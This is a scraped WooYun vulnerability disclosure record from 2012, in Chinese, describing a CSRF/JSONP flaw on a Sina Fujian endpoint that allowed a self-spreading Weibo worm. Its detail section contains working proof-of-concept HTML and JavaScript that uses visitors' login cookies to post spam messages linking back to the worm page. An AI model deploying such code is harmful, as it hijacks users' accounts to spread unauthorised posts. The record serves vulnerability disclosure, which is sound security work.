{"id": 19118, "wybug_id": "wooyun-2012-07637", "wybug_title": "新浪微博jsonp跨域调用利用蠕虫", "wybug_corp": "新浪", "wybug_author": "路人甲", "wybug_date": "2012-05-29 14:38", "wybug_open_date": "2012-07-13 14:39", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "同域存在较敏感接口", "敏感接口", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-13：\t细节向公众公开  简要描述： 福建新浪个人中心调用的两个jsonp接口可以被恶意利用，获取好友信息，并利用cookie劫持无需其他授权发布欺骗信息。就像蠕虫一样传播。 详细说明：  关键代码：\n<head>    \t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />        <title>Sample Page</title>        <script type=\"text/javascript\" src=\"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.7.2.min.js\"></script>        <script type=\"text/javascript\" src=\"http://fj.sinaimg.cn/utils/API-pack.js\"></script>        <script type=\"text/javascript\">            var content = ['嘿嘿，推荐大家收听@丸子-_- ，他写的这个东西很好玩,http://wanz.im/sinaworm.html',                            '我擦，@丸子-_- 他写的这个东西太牛逼了,http://wanz.im/sinaworm.html',                            '昂~@丸子-_- 他写的这个东西好羞色哟~,http://wanz.im/sinaworm.html'],                pics = [\"http://ww1.sinaimg.cn/bmiddle/7e7fc78bgw1ds88rpzhefj.jpg\",\"http://ww1.sinaimg.cn/bmiddle/7e7fc78bgw1ds88rpzhefj.jpg\"],                i = Math.floor(Math.random() * 2),                pic = pics[i],                success = function(json){                    //window.location='http://weibo.com/hiwanz';                },                failure = function(json){                    //alert(json.errmsg);                },                url = \"http://common.fj.sina.com.cn/index.php/201205hgktv/weibolottery/publish?callback=?\";            WBCMD(\"post\",{content:content[Math.round(Math.random()*2)],pic:pic,atNum:1,filter:[],must:[],url:url},success,failure);        </script>    </head>\n   漏洞证明：  http://www.weibo.com/2254653223/yloiziEGU \n\n   修复方案：  自己看   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-05-29 16:59 厂商回复： 感谢提供，我们尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-29 14:48 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  嗯，这是一个方向，希望微博能注意到这种提供给其他项目的潜在接口安全，攻击者确实不会选择防御最好的部分下手，会挑软肋。    \n     2012-05-29 17:22 |    \t\t凤凰 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:6        | 涅磐)\t\t \n  期待尽早公开    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}